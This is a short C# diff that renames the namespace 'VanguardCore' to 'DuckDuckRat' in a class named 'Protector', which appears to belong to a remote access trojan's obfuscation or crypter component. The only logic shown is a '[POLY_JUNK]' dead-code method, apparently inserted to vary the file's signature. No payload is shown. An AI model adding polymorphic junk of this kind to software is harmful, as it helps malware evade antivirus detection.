@@ -3,12 +3,12 @@ using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using Microsoft.Win32;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static class Protector
     {
         // [POLY_JUNK]
-        private static void _vanguard_58fe9b79() {
+        private static void _DuckDuckRat_58fe9b79() {
             int val = 20401;
             if (val > 50000) Console.WriteLine("Hash:" + 20401);
         }
@@ -66,3 +66,5 @@ namespace VanguardCore
         }
     }
 }
+
+
